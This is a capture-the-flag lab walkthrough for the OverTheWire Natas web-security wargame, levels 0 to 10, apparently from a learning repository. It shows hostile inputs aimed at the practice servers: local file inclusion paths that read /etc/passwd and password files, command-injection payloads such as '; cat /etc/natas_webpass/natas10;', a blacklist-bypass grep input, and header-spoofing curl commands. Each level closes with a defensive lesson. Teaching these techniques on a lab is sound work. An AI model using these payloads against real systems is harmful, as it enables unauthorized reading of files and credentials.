# 🌐 OverTheWire: Natas — Level 0 to Level 10 English Guide

> Natas is entirely about **web security**. No SSH — each level has its own website.  
> You'll learn the fundamental web vulnerabilities, from HTML to PHP,  
> from cookie manipulation to command injection.

**URL format:** `http://natasX.natas.labs.overthewire.org` (X = level number)  
**Start:** user `natas0`, password `natas0`  
**Reference:** [mayadevbe.me](https://mayadevbe.me/tags/natas/) (0-6) · [learnhacking.io](https://learnhacking.io/overthewire-natas-walkthrough-levels-6-10/) (7-10)

---

## 🗺️ Overview

| Level | Topic | Technique |
|---|---|---|
| 0 → 1 | HTML source code | DevTools / View Source |
| 1 → 2 | Right-click block | DevTools shortcut |
| 2 → 3 | Accessible directories | Directory listing |
| 3 → 4 | robots.txt | Web crawler knowledge |
| 4 → 5 | HTTP Referer header | curl / header manipulation |
| 5 → 6 | Cookie manipulation | DevTools Storage |
| 6 → 7 | PHP source code | Reading include file |
| 7 → 8 | LFI (Local File Inclusion) | URL parameter manipulation |
| 8 → 9 | PHP code reverse engineering | CyberChef / base64+hex |
| 9 → 10 | Command injection | passthru() vulnerability |
| 10 → 11 | Filtered command injection | grep multiple files |

**Useful tools:**
- [CyberChef](https://gchq.github.io/CyberChef/) — Encoding/decoding operations
- [Burp Suite](https://portswigger.net/burp) — HTTP proxy / request manipulation
- `curl` — HTTP requests from the command line
- Browser DevTools (F12) — Source code, cookies, network

---

## Level 0 — Read the HTML Source Code

### 🔐 Login
```
URL:      http://natas0.natas.labs.overthewire.org
User:     natas0
Password: natas0
```

### 🎯 Task
The password is hidden somewhere on the page.

### 📖 Theory: HTML and Comment Tags

**HTML (HyperText Markup Language):** The skeleton of every website. The browser processes HTML and turns it into visual output. Even if the user doesn't see it, the source code is always readable.

**HTML comment tag:** `<!-- this part is not visible in the browser -->` — Developers use it for notes, but leaving sensitive information there is dangerous!

To view source code:
- `F12` → DevTools → Elements / Inspector
- Right-click → "View Page Source"
- `Ctrl+U` (Chrome/Firefox)

### 🔧 Solution

```
F12 → Elements tab → Search inside HTML
<!-- The password for natas1 is <PASSWORD> -->
```

---

## Level 1 → Level 2 — Right-Click Block

### 🎯 Task
Right-click has been disabled. Find the source code anyway.

### 📖 Theory
Right-click can be blocked with JavaScript, but DevTools can always be opened.

### 🔧 Solution

```
Press F12 → DevTools opens (no right-click needed)
In the Elements tab → password in HTML comment
```

> 💡 **Lesson:** Client-side (browser-side) security measures can always be bypassed. Never leave security up to the browser.

---

## Level 2 → Level 3 — Accessible Directories

### 🎯 Task
It says "There is nothing on this page". Look somewhere else.

### 📖 Theory: Web Server Directory Structure

A web server hosts files. The path in the URL shows the file location on the server:
```
http://site.com/files/image.png
→ located at /files/image.png on the server
```

If the server allows directory listing:
```
http://site.com/files/
→ lists all files in the directory!
```

### 🔧 Solution

```
1. F12 → See img tag in source code:
   <img src="files/pixel.png">

2. Navigate to URL:
   http://natas2.natas.labs.overthewire.org/files/

3. Directory is open → users.txt visible

4. http://natas2.natas.labs.overthewire.org/files/users.txt
   → contains natas3's password
```

> 💡 **Lesson:** Directory listing should be disabled on web servers. If left open, attackers can see all files.

---

## Level 3 → Level 4 — robots.txt

### 🎯 Task
Hint in source code: "Not even Google will find it". What does that mean?

### 📖 Theory: robots.txt

**robots.txt:** A file that tells web crawlers (Google, Bing, etc.) which pages should or shouldn't be indexed. Can be found at `http://site.com/robots.txt` on any site.

```
User-agent: *
Disallow: /secret-folder/
```

**IMPORTANT:** robots.txt is NOT a security measure! Pages listed as Disallow are still accessible — it just tells search engines "don't index".

### 🔧 Solution

```
1. Go to robots.txt:
   http://natas3.natas.labs.overthewire.org/robots.txt

2. Find the disallowed directory (e.g. /s3cr3t/)

3. Navigate to that directory:
   http://natas3.natas.labs.overthewire.org/s3cr3t/

4. users.txt → password
```

---

## Level 4 → Level 5 — HTTP Referer Header Manipulation

### 🎯 Task
It says "you must come from natas5" but you're on natas4. Change the Referer header.

### 📖 Theory: HTTP Request Headers

The browser sends various information with each request — **HTTP headers**. Important ones:

- `Referer` → which page the request came from
- `Authorization` → credentials (base64 encoded)
- `Cookie` → session information
- `User-Agent` → browser information

These headers can be manipulated!

```bash
curl "http://natas4.natas.labs.overthewire.org/" \
  -H "Referer: http://natas5.natas.labs.overthewire.org/" \
  -u natas4:<password>
```

### 🔧 Solution — with curl

```bash
# F12 → Network → right-click on request → "Copy as cURL"
# Edit the copied command: change 4 to 5 in Referer

curl "http://natas4.natas.labs.overthewire.org/" \
  -H "Referer: http://natas5.natas.labs.overthewire.org/" \
  -H "Authorization: Basic <base64_credentials>"
```

### 🔧 Alternative — Firefox DevTools

```
F12 → Network → right-click on request → "Edit and Resend"
Replace Referer header with natas5 URL → Send
Response → Raw → password
```

---

## Level 5 → Level 6 — Cookie Manipulation

### 🎯 Task
It says "You are not logged in". Check the cookie.

### 📖 Theory: HTTP Cookie

**Cookie:** HTTP is a stateless protocol — the server doesn't remember sessions. Cookies are stored in the browser and sent to the server with each request. They store session information, preferences, etc.

Important: Cookies are stored **client-side**, so the user can modify them! This is a major security vulnerability.

```
F12 → Storage/Application tab → Cookies → can view and change values
```

### 🔧 Solution

```
1. Go to http://natas5.natas.labs.overthewire.org/
2. F12 → Storage → Cookies → natas5 site
3. Find the "loggedin" cookie → value: 0
4. Double-click → change to 1 → refresh the page
5. Access granted → password appears
```

> 💡 **Lesson:** Security checks should never rely on client-side cookies. Server-side verification is mandatory.

---

## Level 6 → Level 7 — PHP Source Code and Include File

### 🎯 Task
A secret value is required. Inspect the PHP source code.

### 📖 Theory: PHP and Include

**PHP:** A scripting language that runs on the server side. The browser doesn't see PHP code — it only sees the output. But sometimes source code is left accessible.

`include "file.inc"` → adds code/variables from another file. If this file isn't kept secret, it can be accessed directly via URL.

PHP variables start with `$`:
```php
$secret = "secretValue";
if($_POST['secret'] == $secret) { ... }
```

### 🔧 Solution

```
1. Click the "View sourcecode" link → see PHP code
2. Find the line: include "includes/secret.inc"
3. Navigate directly:
   http://natas6.natas.labs.overthewire.org/includes/secret.inc
4. Page appears blank but find $secret value in source code
5. Enter that value in the form → access granted
```

**With curl:**
```bash
curl 'http://natas6.natas.labs.overthewire.org/' \
  -u natas6:<password> \
  --data-raw 'secret=FOEIUWGHFEEUHOFUOIU&submit=Submit'
```

---

## Level 7 → Level 8 — LFI (Local File Inclusion)

### 🎯 Task
There's a `?page=home` parameter in the URL. You can use this parameter to read any file on the server.

### 📖 Theory: Local File Inclusion (LFI)

**LFI:** A vulnerability that occurs when a server uses user input as a file path without validation. An attacker can read any file on the server.

There's a hint in the source code: the password is located at `/etc/natas_webpass/natas8`.

```
http://site.com/index.php?page=home
→ server loads the "home" file

http://site.com/index.php?page=/etc/passwd
→ server loads /etc/passwd!
```

### 🔧 Solution

```
Change the URL:
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

→ natas8's password appears on the page
```

> 💡 **Lesson:** User input should never be used directly as a file path. Input validation is mandatory.

---

## Level 8 → Level 9 — PHP Code Reverse Engineering

### 🎯 Task
The password is encoded. Reverse the encoding function to find the original password.

### 📖 Theory: Reversing an Encoding Chain

PHP source code:
```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

Encoding order: `plaintext → base64 → reverse → hex`

Decoding order is reversed: `hex → reverse → base64 decode → plaintext`

### 🔧 Solution — with CyberChef

1. Open [CyberChef](https://gchq.github.io/CyberChef/)
2. Add "From Hex" operation → enter `3d3d516343746d4d6d6c315669563362`
3. Add "Reverse" operation
4. Add "From Base64" operation
5. Result: `oubWYf2kBq`

**From the command line:**
```bash
echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
```

Enter that value in the form → password is given.

---

## Level 9 → Level 10 — Command Injection

### 🎯 Task
There's a search box, PHP is running a `grep` command. Inject your own command.

### 📖 Theory: Command Injection

PHP source code:
```php
passthru("grep -i $key dictionary.txt");
```

`passthru()` → runs a system command and outputs the result directly. `$key` is user input — completely unfiltered!

In Linux, `;` can chain multiple commands:
```bash
grep -i test dictionary.txt ; ls -la ; cat /etc/passwd
```

### 🔧 Solution

Type in the search box:
```
; cat /etc/natas_webpass/natas10;
```

The command that will be executed:
```bash
grep -i ; cat /etc/natas_webpass/natas10; dictionary.txt
```

→ Password appears on the page!

> 💡 **Lesson:** User input should never be included directly in a command. Use `escapeshellarg()` or a whitelist.

---

## Level 10 → Level 11 — Filtered Command Injection

### 🎯 Task
Now `;`, `|`, `&` characters are filtered. Find a different method.

### 📖 Theory: Bypassing the Filter

PHP code:
```php
if(preg_match('/[;|&]/', $key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
```

No `;`, `|`, `&` but space is free! `grep` can search in multiple files:
```bash
grep -i PATTERN file1 file2
```

We can use this to include the password file directly in the search scope.

### 🔧 Solution

Type in the search box:
```
.* /etc/natas_webpass/natas11
```

The command that will be executed:
```bash
grep -i .* /etc/natas_webpass/natas11 dictionary.txt
```

`.*` matches all lines → entire contents of the password file are output!

> 💡 **Lesson:** Blacklisting (banned character list) is insufficient. Use whitelisting (allowed character list).

---

## 📚 Web Security Concepts Learned

| Concept | Description |
|---|---|
| **View Source** | Viewing HTML source code |
| **HTML Comment** | Hidden information inside `<!-- -->` |
| **Directory Listing** | Directory contents being visible |
| **robots.txt** | Crawler guidance — not security! |
| **HTTP Headers** | Referer, Cookie, Authorization, etc. |
| **Cookie Manipulation** | Changing client-side values |
| **PHP Include** | Adding code from external files — risk of hidden files |
| **LFI** | Local File Inclusion — file path injection |
| **Code Reverse Engineering** | Reversing an encoding chain |
| **Command Injection** | Running system commands via user input |
| **Filter Bypass** | Exploiting blacklist deficiencies |

## 📚 Tools Used

| Tool | Purpose |
|---|---|
| `F12` (DevTools) | Source code, cookies, network |
| `curl` | HTTP requests from command line |
| [CyberChef](https://gchq.github.io/CyberChef/) | Encoding/decoding chains |
| `Ctrl+U` | Quick source code viewing |

---

## 🔗 Useful Resources

- [OverTheWire Natas](https://overthewire.org/wargames/natas/)
- [MayADevBe Natas Walkthrough](https://mayadevbe.me/tags/natas/) (Level 0-6)
- [LearnHacking.io Natas 6-10](https://learnhacking.io/overthewire-natas-walkthrough-levels-6-10/)
- [W3Schools HTML](https://www.w3schools.com/html/) — HTML basics
- [W3Schools PHP](https://www.w3schools.com/php/) — PHP basics
- [MDN HTTP Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview) — HTTP protocol
- [CyberChef](https://gchq.github.io/CyberChef/) — All kinds of encode/decode
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — Most common web vulnerabilities

---

**Next section:** [natas_11-20.md](./natas_11-20.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
